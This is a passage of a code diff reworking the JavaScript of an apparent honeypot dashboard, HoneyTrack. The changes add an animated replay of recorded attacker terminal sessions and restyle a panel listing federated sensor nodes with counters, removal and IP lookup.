+          lines.push({ t: 'cmd', v: cmdStr, d: 700 + Math.min(cmdStr.length * 30, 1000) });
+        }
+        let outList = rawOuts[idx];
+        if (!outList && Array.isArray(c) && c[1]) {
+          outList = String(c[1]).split('\n');
+        }
+        if (Array.isArray(outList)) {
+          outList.forEach((ol) => {
+            if (!ol) return;
+            const isErr = ol.includes('error') || ol.includes('denied') || ol.includes('fail') || ol.includes('CRITICAL');
+            const isOk = ol.startsWith('✔') || ol.includes('passed') || ol.includes('saved');
+            lines.push({ t: isErr ? 'err' : isOk ? 'ok' : 'out', v: ol, d: 250 });
+          });
+        }
+      });
+    } else {
+      lines.push({ t: 'cmd', v: 'whoami', d: 800 });
+      lines.push({ t: 'out', v: sess.username || 'root', d: 250 });
+      lines.push({ t: 'cmd', v: 'uname -a', d: 1000 });
+      lines.push({ t: 'out', v: 'Linux honeypot-primary-sensor 5.15.0-91-generic x86_64', d: 300 });
+    }
+
+    const cmdCount = lines.filter((l) => l.t === 'cmd').length;
+    return {
+      id: sess.session_id || `sess-${Date.now()}`,
+      ip: sess.source_ip || '127.0.0.1',
+      user: sess.username || 'root',
+      host: 'honeypot-sensor',
+      port: sess.service || 'SSH:2222',
+      path: '~',
+      group: 'RECORDED THREAT SESSIONS',
+      label: `${sess.source_ip} · ${sess.service || 'SSH'} (${sess.username || 'root'}) · ${cmdCount} cmd${cmdCount === 1 ? '' : 's'}`,
+      lines
+    };
+  }
+
+  function buildSessionTimings(session) {
+    let curT = 250;
+    session.lines.forEach((ln) => {
+      ln.t0 = curT;
+      if (ln.t === 'cmd') {
+        const charCount = Math.max(1, ln.v.length);
+        const typingDuration = 200 + charCount * 38;
+        ln.t1 = curT + typingDuration;
+        curT = ln.t1 + (ln.d || 350);
+      } else {
+        const outDuration = ln.d || 220;
+        ln.t1 = curT + outDuration;
+        curT = ln.t1 + 60;
+      }
+    });
+    session.tot = curT + 500;
+  }
+
+  function paintReplay() {
+    if (!activeSession) return;
+    const tot = activeSession.tot;
+    const clampedT = Math.min(replayT, tot);
+
+    const cIp = $('#cIp');
+    const cUser = $('#cUser');
+    const cPort = $('#cPort');
+    const cCmd = $('#cCmd');
+    const timeEl = $('#replay-time');
+    const fillEl = $('#replay-fill');
+    const titleEl = $('#replay-title');
+
+    if (cIp) cIp.textContent = activeSession.ip;
+    if (cUser) cUser.textContent = activeSession.user;
+    if (cPort) cPort.textContent = activeSession.port;
+    if (cCmd) cCmd.textContent = String(activeSession.lines.filter((l) => l.t === 'cmd').length);
+    if (timeEl) timeEl.textContent = `${formatReplayTime(clampedT)} / ${formatReplayTime(tot)}`;
+    if (fillEl) fillEl.style.width = `${Math.min(100, (clampedT / tot) * 100).toFixed(1)}%`;
+    if (titleEl) titleEl.textContent = `bash — ${activeSession.ip} (${activeSession.user})`;
+
+    const term = $('#term');
+    if (!term) return;
+
+    activeLineEls.forEach((el, idx) => {
+      const ln = activeSession.lines[idx];
+      if (clampedT < ln.t0) {
+        el.className = 'ln';
+        el.innerHTML = '';
         return;
       }
 
-      const evt = replayEvents[replayIndex];
-      const targetOffset = evt[0];
-      const nextDelay = Math.max(10, Math.floor(((targetOffset - replayElapsedSec) * 1000) / replaySpeed));
+      if (ln.t === 'cmd') {
+        el.className = `ln v ${idx > 0 && activeSession.lines[idx - 1].t !== 'cmd' ? 'mt' : ''}`;
+        const frac = Math.min(1, Math.max(0, (clampedT - ln.t0) / Math.max(1, ln.t1 - ln.t0)));
+        const visibleLen = Math.floor(frac * ln.v.length);
+        const typedText = ln.v.slice(0, visibleLen);
+        const isTyping = frac < 1;
+        const promptHtml = `<span class="u">${escapeHtml(activeSession.user)}</span><span class="at">@</span><span class="h">${escapeHtml(activeSession.host)}</span>:<span class="pth">${escapeHtml(activeSession.path)}</span><span class="d">$ </span>`;
+        el.innerHTML = `${promptHtml}${hlToken(typedText)}${isTyping ? '<span class="caret"></span>' : ''}`;
+      } else {
+        el.className = `ln v out ${ln.t === 'err' ? 'err' : ln.t === 'ok' ? 'ok' : ''}`;
+        el.textContent = ln.v;
+      }
+    });
 
-      replayTimeout = setTimeout(() => {
-        if (!replayIsPlaying) return;
-        const [offset, type, data] = replayEvents[replayIndex];
-        replayElapsedSec = offset;
-        const termOut = $('#terminal-output');
-        const termScreen = $('#terminal-screen');
-        if (termOut && data) {
-          termOut.textContent += data;
-          if (termScreen) termScreen.scrollTop = termScreen.scrollHeight;
+    if (autoScroll) {
+      term.scrollTop = term.scrollHeight;
+    }
+  }
+
+  function tickReplay(now) {
+    if (!replayPlaying) return;
+    if (!replayLastNow) replayLastNow = now;
+    const dt = (now - replayLastNow) * replaySpeed;
+    replayLastNow = now;
+    replayT += dt;
+
+    paintReplay();
+
+    if (activeSession && replayT >= activeSession.tot) {
+      if (replayLoop) {
+        replayT = 0;
+        replayRafId = requestAnimationFrame(tickReplay);
+      } else {
+        replayPlaying = false;
+        const badge = $('#replay-badge');
+        if (badge) {
+          badge.textContent = 'COMPLETED';
+          badge.className = 'badge done';
         }
-        updateReplayProgress();
-        replayIndex++;
-        scheduleNext();
-      }, nextDelay);
+      }
+      return;
     }
 
-    scheduleNext();
+    replayRafId = requestAnimationFrame(tickReplay);
   }
 
-  function stopReplay() {
-    replayIsPlaying = false;
-    if (replayTimeout) {
-      clearTimeout(replayTimeout);
-      replayTimeout = null;
+  function playReplay() {
+    if (!activeSession) return;
+    if (replayT >= activeSession.tot) replayT = 0;
+    replayPlaying = true;
+    replayLastNow = performance.now();
+    const badge = $('#replay-badge');
+    if (badge) {
+      badge.textContent = 'REPLAYING';
+      badge.className = 'badge';
     }
-    const playBtn = $('#btn-replay-play');
-    if (playBtn) playBtn.textContent = '▶ PLAY';
+    if (replayRafId) cancelAnimationFrame(replayRafId);
+    replayRafId = requestAnimationFrame(tickReplay);
   }
 
-  function updateReplayProgress() {
-    const totalSec = currentReplaySession ? currentReplaySession.duration_seconds || 1 : 1;
-    const currentSec = Math.min(totalSec, replayElapsedSec);
-    const pct = Math.min(100, Math.max(0, (currentSec / totalSec) * 100));
-    const fill = $('#replay-timeline-fill');
-    if (fill) fill.style.width = `${pct.toFixed(1)}%`;
-
-    const timer = $('#replay-timer');
-    if (timer) {
-      const pad = (n) => String(Math.floor(n)).padStart(2, '0');
-      timer.textContent = `${pad(currentSec / 60)}:${pad(currentSec % 60)} / ${pad(totalSec / 60)}:${pad(totalSec % 60)}`;
+  function pauseReplay() {
+    replayPlaying = false;
+    if (replayRafId) {
+      cancelAnimationFrame(replayRafId);
+      replayRafId = null;
     }
+    const badge = $('#replay-badge');
+    if (badge && badge.textContent !== 'COMPLETED') {
+      badge.textContent = 'PAUSED';
+      badge.className = 'badge paused';
+    }
+  }
+
+  function restartReplay() {
+    replayT = 0;
+    paintReplay();
+    playReplay();
+  }
+
+  function loadSessionIntoTerminal(session) {
+    pauseReplay();
+    activeSession = session;
+    buildSessionTimings(session);
+
+    const term = $('#term');
+    if (term) {
+      term.innerHTML = '';
+      activeLineEls = session.lines.map(() => {
+        const d = document.createElement('div');
+        d.className = 'ln';
+        term.appendChild(d);
+        return d;
+      });
+    }
+
+    const labelEl = $('#replay-dd-label');
+    if (labelEl) labelEl.textContent = session.label || session.ip;
+
+    const listEl = $('#replay-dd-list');
+    if (listEl) {
+      listEl.querySelectorAll('li').forEach((li) => {
+        const isSel = li.dataset.id === session.id;
+        li.setAttribute('aria-selected', isSel ? 'true' : 'false');
+        if (isSel) li.classList.add('act');
+        else li.classList.remove('act');
+      });
+    }
+
+    replayT = 0;
+    paintReplay();
+    playReplay();
+  }
+
+  async function populateReplayDropdown(preferredId = null) {
+    let apiSessions = [];
+    try {
+      const res = await fetch('/api/sessions?limit=50').then((r) => r.json());
+      if (res.status === 'success' && Array.isArray(res.sessions)) {
+        apiSessions = res.sessions.map(parseApiSession);
+      }
+    } catch (_) {}
+
+    replaySessions = [...CURATED_REPLAY_SCENARIOS, ...apiSessions];
+
+    const listEl = $('#replay-dd-list');
+    if (!listEl) return;
+    listEl.innerHTML = '';
+
+    const groups = {};
+    replaySessions.forEach((s) => {
+      const g = s.group || 'GENERAL';
+      if (!groups[g]) groups[g] = [];
+      groups[g].push(s);
+    });
+
+    Object.entries(groups).forEach(([grpName, sessList]) => {
+      const grpHeader = document.createElement('div');
+      grpHeader.className = 'dd-grp-label';
+      grpHeader.textContent = grpName;
+      listEl.appendChild(grpHeader);
+
+      sessList.forEach((s) => {
+        const li = document.createElement('li');
+        li.dataset.id = s.id;
+        li.setAttribute('role', 'option');
+        li.setAttribute('aria-selected', 'false');
+        li.tabIndex = -1;
+
+        const cmdCount = s.lines ? s.lines.filter((l) => l.t === 'cmd').length : 1;
+        li.innerHTML = `
+          <span>${escapeHtml(s.ip)} · ${escapeHtml(s.port)} <small style="color:var(--muted);">${escapeHtml(s.user)}</small></span>
+          <small>${cmdCount} cmd${cmdCount === 1 ? '' : 's'}</small>
+          <svg class="chk" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 13l4 4L19 7"/></svg>
+        `;
+
+        li.addEventListener('click', () => {
+          selectReplaySessionById(s.id);
+          closeReplayDropdown();
+        });
+
+        listEl.appendChild(li);
+      });
+    });
+
+    const targetId = preferredId || (replaySessions[0] ? replaySessions[0].id : null);
+    if (targetId) {
+      await selectReplaySessionById(targetId);
+    }
+  }
+
+  async function selectReplaySessionById(sessionId) {
+    if (!sessionId && replaySessions.length > 0) {
+      loadSessionIntoTerminal(replaySessions[0]);
+      return;
+    }
+
+    const found = replaySessions.find((s) => s.id === sessionId || s.ip === sessionId);
+    if (found) {
+      loadSessionIntoTerminal(found);
+      return;
+    }
+
+    try {
+      const res = await fetch(`/api/sessions/${encodeURIComponent(sessionId)}/replay`).then((r) => r.json());
+      if (res && res.status === 'success' && res.session) {
+        const parsed = parseApiSession(res.session);
+        replaySessions.push(parsed);
+        loadSessionIntoTerminal(parsed);
+        return;
+      }
+    } catch (_) {}
+
+    if (replaySessions.length > 0) {
+      loadSessionIntoTerminal(replaySessions[0]);
+    } else if (CURATED_REPLAY_SCENARIOS[0]) {
+      loadSessionIntoTerminal(CURATED_REPLAY_SCENARIOS[0]);
+    }
+  }
+
+  function toggleReplayDropdown() {
+    const dd = $('#replay-dd');
+    const btn = $('#replay-dd-btn');
+    if (!dd || !btn) return;
+    const isOpen = dd.classList.toggle('open');
+    btn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+  }
+
+  function closeReplayDropdown() {
+    const dd = $('#replay-dd');
+    const btn = $('#replay-dd-btn');
+    if (dd) dd.classList.remove('open');
+    if (btn) btn.setAttribute('aria-expanded', 'false');
   }
 
   function initReplayModal() {
-    const btnToggle = $('#btn-replay-modal-toggle');
-    const modal = $('#replay-modal');
-    const backdrop = $('#replay-modal-backdrop');
+    const scrim = $('#replay-scrim');
+    const btnCloseDot = $('#btn-close-replay-dot');
     const btnClose = $('#btn-close-replay-modal');
+    const copyBtn = $('#btn-replay-copy');
+    const restartBtn = $('#btn-replay-restart');
+    const loopBtn = $('#btn-replay-loop');
+    const ddBtn = $('#replay-dd-btn');
+    const bar = $('#replay-bar');
 
     function openModal(sessionId = null) {
-      if (modal) {
-        modal.hidden = false;
-        modal.style.display = 'flex';
+      if (scrim) {
+        scrim.classList.remove('hide');
+        scrim.style.display = 'grid';
       }
-      if (backdrop) {
-        backdrop.hidden = false;
-        backdrop.style.display = 'block';
-      }
-      loadReplaySessionsList(sessionId);
+      populateReplayDropdown(sessionId);
     }
 
     function closeModal() {
-      stopReplay();
-      if (modal) {
-        modal.hidden = true;
-        modal.style.display = 'none';
-      }
-      if (backdrop) {
-        backdrop.hidden = true;
-        backdrop.style.display = 'none';
+      pauseReplay();
+      closeReplayDropdown();
+      if (scrim) {
+        scrim.classList.add('hide');
+        scrim.style.display = 'none';
       }
     }
 
-    btnToggle?.addEventListener('click', () => openModal());
+    btnCloseDot?.addEventListener('click', closeModal);
     btnClose?.addEventListener('click', closeModal);
-    backdrop?.addEventListener('click', closeModal);
+    scrim?.addEventListener('click', (e) => {
+      if (e.target === scrim) closeModal();
+    });
+
     document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && modal && !modal.hidden) closeModal();
-    });
-
-    $('#replay-session-select')?.addEventListener('change', (e) => {
-      if (e.target.value) selectReplaySession(e.target.value);
-    });
-
-    $('#btn-replay-play')?.addEventListener('click', () => {
-      if (replayIsPlaying) {
-        stopReplay();
-      } else {
-        if (replayIndex >= replayEvents.length) {
-          replayIndex = 0;
-          replayElapsedSec = 0;
-          const termOut = $('#terminal-output');
-          if (termOut) termOut.textContent = '';
-        }
-        startReplay();
+      if (e.key === 'Escape' && scrim && !scrim.classList.contains('hide')) {
+        closeModal();
       }
     });
 
-    $('#btn-replay-restart')?.addEventListener('click', () => {
-      stopReplay();
-      replayIndex = 0;
-      replayElapsedSec = 0;
-      const termOut = $('#terminal-output');
-      if (termOut) termOut.textContent = '';
-      updateReplayProgress();
-      startReplay();
+    ddBtn?.addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleReplayDropdown();
     });
 
-    document.querySelectorAll('.speed-btn').forEach((btn) => {
-      btn.addEventListener('click', () => {
-        document.querySelectorAll('.speed-btn').forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-        replaySpeed = Number(btn.dataset.speed) || 1;
+    document.addEventListener('click', (e) => {
+      if (!e.target.closest('#replay-dd')) {
+        closeReplayDropdown();
+      }
+    });
+
+    restartBtn?.addEventListener('click', () => restartReplay());
+
+    loopBtn?.addEventListener('click', () => {
+      replayLoop = !replayLoop;
+      loopBtn.classList.toggle('on', replayLoop);
+      loopBtn.setAttribute('aria-pressed', replayLoop ? 'true' : 'false');
+    });
+
+    copyBtn?.addEventListener('click', () => {
+      const term = $('#term');
+      if (!term) return;
+      const text = term.innerText || term.textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        const copySpan = copyBtn.querySelector('span');
+        if (copySpan) {
+          copySpan.textContent = 'Copied!';
+          setTimeout(() => { copySpan.textContent = 'Copy'; }, 1800);
+        }
       });
+    });
+
+    // Speed Selector Segments
+    const segButtons = document.querySelectorAll('#replay-speed button');
+    segButtons.forEach((btn) => {
+      btn.addEventListener('click', () => {
+        segButtons.forEach((b) => b.classList.remove('on'));
+        btn.classList.add('on');
+        replaySpeed = Number(btn.dataset.s) || 1;
+      });
+    });
+
+    // Interactive Timeline Scrubbing
+    bar?.addEventListener('click', (e) => {
+      if (!activeSession) return;
+      const rect = bar.getBoundingClientRect();
+      const ratio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
+      replayT = ratio * activeSession.tot;
+      paintReplay();
+    });
+
+    // Spacebar to pause/resume playback
+    document.addEventListener('keydown', (e) => {
+      if (scrim && !scrim.classList.contains('hide') && e.code === 'Space' && !e.target.closest('input, textarea, select')) {
+        e.preventDefault();
+        if (replayPlaying) pauseReplay();
+        else playReplay();
+      }
     });
 
     window.openTerminalReplayModal = openModal;
@@ -1274,27 +2066,72 @@
       return isNaN(parsed) ? new Date(ts).getTime() : parsed;
     }
 
-    function openModal() {
-      if (modal) {
-        modal.hidden = false;
-        modal.style.display = 'flex';
+    function countUp(el, to, duration = 850) {
+      if (!el) return;
+      to = Number(to) || 0;
+      const reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (reduce) {
+        el.textContent = to.toLocaleString();
+        return;
       }
+      const raw = parseInt(String(el.textContent).replace(/[^\d]/g, ''), 10);
+      const from = isNaN(raw) ? 0 : raw;
+      if (from === to) {
+        el.textContent = to.toLocaleString();
+        return;
+      }
+      const start = performance.now();
+      const ease = (t) => 1 - Math.pow(1 - t, 3);
+      (function tick(now) {
+        const t = Math.min((now - start) / duration, 1);
+        el.textContent = Math.round(from + (to - from) * ease(t)).toLocaleString();
+        if (t < 1) requestAnimationFrame(tick);
+      })(start);
+    }
+
+    // Public hook for live dashboard attack ingestion counter
+    window.updateAttacks = function (n) {
+      const el = $('#dash-fed-reported-attacks');
+      if (el) {
+        el.dataset.count = n;
+        countUp(el, n, 600);
+        el.classList.remove('flash');
+        void el.offsetWidth;
+        el.classList.add('flash');
+      }
+    };
+
+    function openModal() {
       if (backdrop) {
         backdrop.hidden = false;
-        backdrop.style.display = 'block';
+        void backdrop.offsetWidth; // Force reflow for silky smooth CSS transition
+        backdrop.classList.add('open');
+      }
+      if (modal) {
+        modal.hidden = false;
+      }
+      if (searchInput) searchInput.value = '';
+      if (searchResults) {
+        searchResults.hidden = true;
+        searchResults.innerHTML = '';
       }
       if (statusNote) statusNote.textContent = '';
       loadFederationData();
     }
 
     function closeModal() {
-      if (modal) {
-        modal.hidden = true;
-        modal.style.display = 'none';
-      }
       if (backdrop) {
-        backdrop.hidden = true;
-        backdrop.style.display = 'none';
+        backdrop.classList.remove('open');
+        setTimeout(() => {
+          if (!backdrop.classList.contains('open')) {
+            backdrop.hidden = true;
+            if (searchInput) searchInput.value = '';
+            if (searchResults) {
+              searchResults.hidden = true;
+              searchResults.innerHTML = '';
+            }
+          }
+        }, 230);
       }
     }
 
@@ -1306,7 +2143,7 @@
         if (res.status === 'success') {
           if (res.local_node) {
             if ($('#fed-local-name')) $('#fed-local-name').textContent = res.local_node.node_name || 'HoneyTrack Primary Node';
-            if ($('#fed-local-region')) $('#fed-local-region').textContent = `Region: ${res.local_node.region || 'Global'}`;
+            if ($('#fed-local-region')) $('#fed-local-region').textContent = `Region: ${res.local_node.region || 'AP-SOUTH-1 (Mumbai)'}`;
           }
 
           const nodes = res.nodes || [];
@@ -1314,40 +2151,80 @@
           const onlineCount = nodes.filter((n) => n.status === 'online').length;
           const totalAttacksReported = nodes.reduce((sum, n) => sum + (n.attacks_reported || 0), 0);
 
-          // Update Main Dashboard Federated Overview Bar
+          // Update Upgraded Global Sensor Mesh Monitor Card
           const dashTotalEl = $('#dash-fed-total-count');
+          const dashTotalLabel = $('#dash-fed-total-label');
           const dashOnlineEl = $('#dash-fed-online-count');
           const dashAttacksEl = $('#dash-fed-reported-attacks');
           const dashPillsEl = $('#dash-fed-node-pills');
 
-          if (dashTotalEl) dashTotalEl.textContent = `${totalNodes} Node${totalNodes === 1 ? '' : 's'} Connected`;
-          if (dashOnlineEl) dashOnlineEl.textContent = `${onlineCount} Active Online`;
-          if (dashAttacksEl) dashAttacksEl.textContent = `· ${totalAttacksReported} Remote Attacks Ingested`;
-          if ($('#fed-modal-nodes-badge')) $('#fed-modal-nodes-badge').textContent = `${totalNodes} Node${totalNodes === 1 ? '' : 's'}`;
+          if (dashTotalEl) {
+            countUp(dashTotalEl, totalNodes);
+            dashTotalEl.dataset.count = totalNodes;
+          }
+          if (dashTotalLabel) {
+            dashTotalLabel.textContent = totalNodes === 1 ? 'Node Connected' : 'Nodes Connected';
+          }
+          if (dashOnlineEl) {
+            countUp(dashOnlineEl, onlineCount);
+            dashOnlineEl.dataset.count = onlineCount;
+          }
+          if (dashAttacksEl) {
+            countUp(dashAttacksEl, totalAttacksReported);
+            dashAttacksEl.dataset.count = totalAttacksReported;
+          }
+          if ($('#fed-modal-nodes-badge')) $('#fed-modal-nodes-badge').textContent = `${totalNodes} ${totalNodes === 1 ? 'node' : 'nodes'}`;
 
           if (dashPillsEl) {
             dashPillsEl.innerHTML = '';
-            nodes.slice(0, 5).forEach((n) => {
-              const pill = document.createElement('span');
-              const isHub = n.is_hub;
-              pill.className = `fed-role-badge ${isHub ? 'hub' : 'sensor'}`;
-              pill.style.cssText = 'font-size:10.5px;padding:4px 10px;cursor:pointer;';
-              pill.title = `${n.node_name} (${n.region}) - ${n.status.toUpperCase()} - ${n.attacks_reported || 0} attacks`;
-              pill.innerHTML = `<span class="node-status-dot ${n.status === 'online' ? 'online' : 'offline'}" style="margin-right:4px;"></span> ${escapeHtml(n.node_name || n.node_id)}`;
-              pill.addEventListener('click', openModal);
-              dashPillsEl.appendChild(pill);
+
+            // Ensure primary hub node is first, followed by at most 2 remote sensors
+            const primaryNode = nodes.find((n) => n.is_hub || n.is_local) || nodes[0];
+            const remoteNodes = nodes.filter((n) => n !== primaryNode);
+
+            // Display primary hub + at most 2 remote sensors
+            const displayedNodes = [];
+            if (primaryNode) displayedNodes.push(primaryNode);
+            displayedNodes.push(...remoteNodes.slice(0, 2));
+
+            // Remaining count after primary hub + 2 remote sensors
+            const remainingCount = nodes.length - displayedNodes.length;
+
+            displayedNodes.forEach((n) => {
+              const chip = document.createElement('span');
+              const isPrimary = n.is_hub || n.is_local;
+              const isOnline = n.status === 'online';
+              chip.className = `chip ${isPrimary ? 'primary' : ''}`;
+              chip.title = `${n.node_name || n.node_id} (${n.region || 'Global'}) - ${n.status.toUpperCase()} - ${n.attacks_reported || 0} attacks reported. Click to manage.`;
+              chip.innerHTML = `<span class="dot ${isOnline ? '' : 'off'}"></span>${escapeHtml(n.node_name || n.node_id)}`;
+              chip.addEventListener('click', openModal);
+              dashPillsEl.appendChild(chip);
             });
-            if (nodes.length > 5) {
-              const morePill = document.createElement('span');
-              morePill.className = 'fed-role-badge sensor';
-              morePill.style.cssText = 'font-size:10.5px;padding:4px 8px;cursor:pointer;color:#38bdf8;';
-              morePill.textContent = `+${nodes.length - 5} more`;
-              morePill.addEventListener('click', openModal);
-              dashPillsEl.appendChild(morePill);
+
+            if (remainingCount > 0) {
+              const moreBtn = document.createElement('button');
+              moreBtn.type = 'button';
+              moreBtn.className = 'chip more';
+              moreBtn.title = `Show ${remainingCount} more sensor node${remainingCount === 1 ? '' : 's'} in Federation Mesh`;
+              moreBtn.textContent = `+${remainingCount} more`;
+              moreBtn.addEventListener('click', openModal);
+              dashPillsEl.appendChild(moreBtn);
             }
           }
 
+          // Attach cursor spotlight on mesh card
+          const meshCard = $('#mesh-card');
+          if (meshCard && !meshCard._spotlightBound) {
+            meshCard._spotlightBound = true;
+            meshCard.addEventListener('pointermove', (e) => {
+              const r = meshCard.getBoundingClientRect();
+              meshCard.style.setProperty('--mx', (e.clientX - r.left) + 'px');
+              meshCard.style.setProperty('--my', (e.clientY - r.top) + 'px');
+            });
+          }
+
           const tbody = $('#fed-nodes-tbody');
+          const emptyStateEl = $('#fed-empty-state');
           if (!tbody) {
             console.warn('[HoneyTrack] #fed-nodes-tbody element not found in DOM.');
             return;
@@ -1355,33 +2232,43 @@
           tbody.innerHTML = '';
 
           if (nodes.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="7" class="empty-row" style="text-align:center;padding:24px;color:#94a3b8;">No sensor nodes registered. Click "SEED GLOBAL SENSORS" above to connect demo sensors.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="7" class="empty">No sensors connected.</td></tr>';
+            if (emptyStateEl) emptyStateEl.hidden = false;
             return;
           }
+          if (emptyStateEl) emptyStateEl.hidden = true;
 
           nodes.forEach((n) => {
             try {
               const tr = document.createElement('tr');
+              tr.dataset.nodeId = n.node_id;
               const isOnline = n.status === 'online';
-              const statusClass = isOnline ? 'online' : 'offline';
-              const roleClass = n.is_hub ? 'hub' : 'sensor';
-              const roleText = n.is_hub ? 'HUB' : 'SENSOR';
-              const localTag = n.is_local ? ' <span style="color:#38bdf8;font-size:9.5px;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.3);padding:1px 5px;border-radius:3px;">[THIS HOST]</span>' : '';
-              const deleteAction = n.is_local
-                ? '<span style="color:#64748b;font-size:10px;font-weight:600;">PROTECTED</span>'
-                : `<button type="button" class="btn-del-node" data-node-id="${escapeHtml(n.node_id)}" onclick="window.honeytrackRemoveNode('${escapeHtml(n.node_id)}')" style="background:rgba(239,68,68,0.15);border:1px solid #ef4444;color:#ef4444;border-radius:4px;padding:4px 10px;font-size:10.5px;cursor:pointer;font-family:var(--font-mono);font-weight:700;transition:all 0.15s;">REMOVE</button>`;
+              const localTag = n.is_local
+                ? ' <span class="host-tag">[THIS HOST]</span>'
+                : '';
 
               const hbTs = parseTimestamp(n.last_heartbeat);
               const hbText = hbTs ? timeAgo(hbTs) : 'just now';
 
               tr.innerHTML = `
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;"><strong>${escapeHtml(n.node_name || n.node_id)}</strong>${localTag}<div style="color:#64748b;font-size:10px;">${escapeHtml(n.node_id)}</div></td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;">${escapeHtml(n.region || 'Global')}</td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;"><span class="node-status-dot ${statusClass}"></span>${isOnline ? 'ONLINE' : 'OFFLINE'}</td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;">${n.attacks_reported || 0}</td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;">${hbText}</td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;color:#cbd5e1;"><span class="fed-role-badge ${roleClass}">${roleText}</span></td>
-                <td style="padding:11px 14px;border-bottom:1px solid #0f172a;text-align:center;">${deleteAction}</td>
+                <td>
+                  <div class="node-name">${escapeHtml(n.node_name || n.node_id)}${localTag}</div>
+                  <div class="node-id">${escapeHtml(n.node_id)}</div>
+                </td>
+                <td class="mono">${escapeHtml(n.region || 'Global')}</td>
+                <td>
+                  <span class="pill ${isOnline ? 'online' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>
+                </td>
+                <td class="num text-center">${n.attacks_reported || 0}</td>
+                <td class="mono">${hbText}</td>
+                <td class="text-center">
+                  <span class="role ${n.is_hub ? 'hub' : 'sensor'}">${n.is_hub ? 'HUB' : 'SENSOR'}</span>
+                </td>
+                <td class="text-right">
+                  ${n.is_local
+                    ? '<span class="protected">PROTECTED</span>'
+                    : `<button type="button" class="btn btn-danger btn-del-node" data-node-id="${escapeHtml(n.node_id)}">REMOVE</button>`}
+                </td>
               `;
               tbody.appendChild(tr);
             } catch (rowErr) {
@@ -1394,21 +2281,25 @@
       }
     }
 
-    // Node deletion handler
+    // Node deletion handler with smooth slide-fade animation
     async function deleteNode(nid) {
       if (!nid) return;
-      if (!confirm(`Are you sure you want to remove remote sensor node '${nid}'?`)) return;
+      if (!confirm(`Are you sure you want to disconnect sensor '${nid}'?`)) return;
+      const row = $(`#fed-nodes-tbody tr[data-node-id="${nid}"]`);
+      if (row) row.classList.add('removing');
       try {
-        if (statusNote) statusNote.textContent = `Removing node '${nid}'...`;
+        if (statusNote) statusNote.textContent = `Removing sensor '${nid}'...`;
         const res = await fetch(`/api/federation/nodes/${encodeURIComponent(nid)}`, { method: 'DELETE' }).then((r) => r.json());
         if (res.status === 'success') {
-          if (statusNote) statusNote.textContent = `Node '${nid}' removed from roster.`;
-          await loadFederationData();
+          if (statusNote) statusNote.textContent = `Sensor '${nid}' disconnected from mesh.`;
+          setTimeout(() => loadFederationData(), 200);
         } else {
+          if (row) row.classList.remove('removing');
           alert(res.error || 'Failed to remove node.');
           if (statusNote) statusNote.textContent = res.error || 'Failed to remove node.';
         }
       } catch (err) {
+        if (row) row.classList.remove('removing');
         alert('Network error removing node.');
         if (statusNote) statusNote.textContent = 'Network error removing node.';
       }
@@ -1466,25 +2357,25 @@
             `;
 
         searchResults.innerHTML = `
-          <div style="background:#0b1120;border:1px solid #1e293b;border-radius:8px;padding:14px 16px;display:flex;flex-direction:column;gap:10px;">
+          <div class="fed-search-results-box">
             <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
               <div>
-                <strong style="font-size:16px;color:#f8fafc;font-family:var(--font-mono);">${escapeHtml(res.ip)}</strong>
-                <span style="margin-left:10px;font-size:12px;color:#94a3b8;">${escapeHtml(res.city)}, ${escapeHtml(res.country)} (${escapeHtml(res.isp)})</span>
+                <strong style="font-size:15px;color:var(--text);font-family:var(--mono);">${escapeHtml(res.ip)}</strong>
+                <span style="margin-left:10px;font-size:12px;color:var(--text-dim);">${escapeHtml(res.city)}, ${escapeHtml(res.country)} (${escapeHtml(res.isp)})</span>
               </div>
               <div style="display:flex;align-items:center;gap:8px;">
-                <span style="font-size:11px;font-family:var(--font-mono);color:#cbd5e1;">Caught by: <strong style="color:#38bdf8;">${escapeHtml(res.origin_node)}</strong></span>
-                <span class="fed-role-badge hub" style="color:${riskColor(res.risk_score)};border-color:${riskColor(res.risk_score)};">${res.risk_score} / 100 RISK</span>
+                <span style="font-size:11px;font-family:var(--mono);color:var(--text-dim);">Caught by: <strong style="color:var(--accent);">${escapeHtml(res.origin_node)}</strong></span>
+                <span class="role hub" style="color:${riskColor(res.risk_score)};border-color:${riskColor(res.risk_score)};">${res.risk_score} / 100 RISK</span>
               </div>
             </div>
 
-            <div style="font-size:11px;color:#94a3b8;font-family:var(--font-mono);">
-              <strong>Captured Attacker Commands:</strong>
+            <div style="font-size:12px;color:var(--text-dim);font-family:var(--mono);">
+              <strong style="color:var(--text);">Captured Attacker Commands:</strong>
               ${cmdHtml}
             </div>
 
-            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px;border-top:1px solid #1e293b;padding-top:10px;flex-wrap:wrap;gap:8px;">
-              <span style="font-size:10.5px;color:#64748b;font-family:var(--font-mono);">Trapped Intrusions: ${res.total_attacks} · Service: ${escapeHtml(res.service)}</span>
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px;border-top:1px solid var(--border);padding-top:10px;flex-wrap:wrap;gap:8px;">
+              <span style="font-size:11px;color:var(--text-faint);font-family:var(--mono);">Trapped Intrusions: ${res.total_attacks} · Service: ${escapeHtml(res.service)}</span>
               ${replayActionHtml}
             </div>
           </div>
@@ -1516,9 +2407,16 @@
     btnToggle?.addEventListener('click', openModal);
     $('#btn-dash-open-fed')?.addEventListener('click', openModal);
